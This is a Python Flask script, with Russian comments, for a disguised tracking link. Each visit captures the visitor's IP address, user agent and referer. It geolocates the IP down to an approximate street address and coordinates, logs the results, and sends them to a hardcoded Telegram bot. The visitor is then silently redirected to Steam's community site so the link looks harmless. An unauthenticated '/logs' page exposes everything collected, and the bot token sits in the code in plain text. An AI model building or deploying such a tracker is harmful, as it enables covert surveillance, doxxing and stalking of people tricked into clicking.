from flask import Flask, request, redirect
import datetime
import requests
import os
import json

app = Flask(__name__)

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"
LOG_FILE = "visits.txt"
REDIRECT_URL = "https://steamcommunity.com/"

def get_full_geo(ip):
    """Получает страну, город, координаты и примерный адрес"""
    try:
        # 1. Получаем базовые данные + координаты
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,org,as,timezone")
        d = r.json()
        if d['status'] != 'success':
            return "Неизвестно", None, None
        
        country = d.get('country', 'Неизвестно')
        city = d.get('city', 'Неизвестно')
        lat = d.get('lat')
        lon = d.get('lon')
        isp = d.get('isp', 'Неизвестно')
        
        # 2. Пробуем получить точный адрес через Nominatim (OpenStreetMap)
        address = f"{country}, {city}"
        if lat and lon:
            try:
                geo_req = requests.get(
                    f"https://nominatim.openstreetmap.org/reverse",
                    params={
                        "lat": lat,
                        "lon": lon,
                        "format": "json",
                        "zoom": 18,
                        "addressdetails": 1
                    },
                    headers={"User-Agent": "MyTracker/1.0"}
                )
                if geo_req.status_code == 200:
                    geo_data = geo_req.json()
                    if 'address' in geo_data:
                        addr = geo_data['address']
                        parts = []
                        if 'road' in addr: parts.append(addr['road'])
                        if 'house_number' in addr: parts.append(addr['house_number'])
                        if 'suburb' in addr: parts.append(addr['suburb'])
                        if parts:
                            address = f"{country}, {city}, " + ", ".join(parts)
            except:
                pass
        
        # 3. Формируем результат
        coords = f"{lat}, {lon}" if lat and lon else "Нет координат"
        return address, coords, isp
    
    except Exception as e:
        print(f"Geo error: {e}")
        return "Ошибка геолокации", None, None

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except Exception as e:
        print(f"Telegram error: {e}")

@app.route('/')
def track():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent', '')
    ref = request.headers.get('Referer', 'Direct')
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Получаем расширенную геолокацию
    address, coords, isp = get_full_geo(ip)
    
    # Лог в файл
    log = f"[{now}] IP: {ip} | {address} | Координаты: {coords} | ISP: {isp} | UA: {ua[:60]} | Ref: {ref}\n"
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log)
    
    # Отправка в Telegram с адресом и координатами
    msg = f"📍 Новый визит!\nIP: {ip}\n📍 Адрес: {address}\n🗺️ Координаты: {coords}\n🖥️ Устройство: {ua[:60]}"
    send_tg(msg)
    
    return redirect(REDIRECT_URL, 302)

@app.route('/logs')
def logs():
    if not os.path.exists(LOG_FILE):
        return "No logs"
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
